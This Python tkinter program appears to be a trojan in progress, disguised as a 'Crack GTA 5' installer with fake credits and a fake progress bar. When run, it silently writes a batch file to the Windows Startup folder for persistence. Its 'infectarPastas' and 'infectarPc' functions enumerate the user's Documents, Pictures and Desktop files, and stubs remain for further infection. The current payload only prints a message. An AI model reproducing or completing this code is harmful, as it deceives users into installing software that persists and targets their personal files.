import time
import os
from os import listdir
import threading
from tkinter import *
from tkinter import ttk

class Principal:

        win = Tk()

        def __init__(self):

                self.win.title("Crack GTA 5")
                self.win.geometry("500x300+150+150")

                lbTitulo = Label(self.win, text="Crack GTA 5")
                lbDescricao = Label(self.win, text="Versão 4.20 - By Devils_Crack")
                lbDesenvolvedores1 = Label(self.win, fg="red", text="weberRich4rds, S4tiv4, kamaLion")
                lbDesenvolvedores2 = Label(self.win, fg="red", text="susuk1_green, qwerty_Dev1l")
                lbDesenvolvedores3 = Label(self.win, fg="red", text="she_kakarot4, mc_hackudao")

                btnProximo = Button(self.win, width=15, text="Proximo", command=self.btn_click)
                btnCancelar = Button(self.win, width=15, text="Cancelar", command=self.btn_click)

                imagem = PhotoImage(file="imagem.png")
                img = Label(self.win, image=imagem)
                img.imagem = imagem
                img.pack()

                lbTitulo.place(x=250, y=10)
                lbDescricao.place(x=250, y=40)
                lbDesenvolvedores1.place(x=250, y=100)
                lbDesenvolvedores2.place(x=250, y=140)
                lbDesenvolvedores3.place(x=250, y=180)
                img.place(x=0, y=0)

                btnProximo.place(x=380, y=250)
                btnCancelar.place(x=250, y=250)

                self.criarBatInicializacao()
                self.infectarPastas()
                self.criarProcessoWindows()

                self.win.mainloop()


        def criarBatInicializacao(self):

                with open(os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/file.bat", "w") as arq:
                        arq.write("echo off")
                        arq.write("\n")
                        arq.write("cls")
                        arq.write("\n")
                        arq.write("echo oi sumida rsrs")
                        arq.write("\n")
                        arq.write("pause")
                        arq.write("\n")
                        arq.close()


        def criarProcessoWindows(self):
                print('')

        def infectarPastas(self):

                user = os.path.expandvars("%userprofile%")

                documentos = [arq for arq in listdir(user + "/Documents")]
                imagens = [arq for arq in listdir(user + "/Pictures")]
                areaTrabalho = [arq for arq in listdir(user + "/Desktop")]

                # Fazer algo
                
                print(documentos)
                print(imagens)
                print(areaTrabalho)
        

        def btn_click(self):
                
                self.win.destroy()

                Progresso()

                



class Progresso:

        win = Tk()
        var_barra = 1

        def __init__(self):
                self.win.title("Crack GTA 5")
                self.win.geometry("500x80+150+150")
                
                minha_barra = ttk.Progressbar(self.win, length=500, variable=self.var_barra, maximum=100)
                lbProgresso = Label(self.win, text="Aguarde até o fim da instalação")

                minha_barra.place(x=0, y=40)
                lbProgresso.place(x=10, y=0)        

                tPb = threading.Thread(target=self.infectarPc)
                tPb.start()

                if tPb:
                        self.progressbar()
                        

                self.win.mainloop()


        def progressbar(self):
                
                for x in range(0, 101):
                        self.var_barra = x

                        print(self.var_barra)

                        self.win.update()
                        time.sleep(.500)


        def navegarPastas(self):
                dir = os.path.dirname(os.path.realpath(__file__))


        def infectarPc(self):
                self.navegarPastas()

principal = Principal()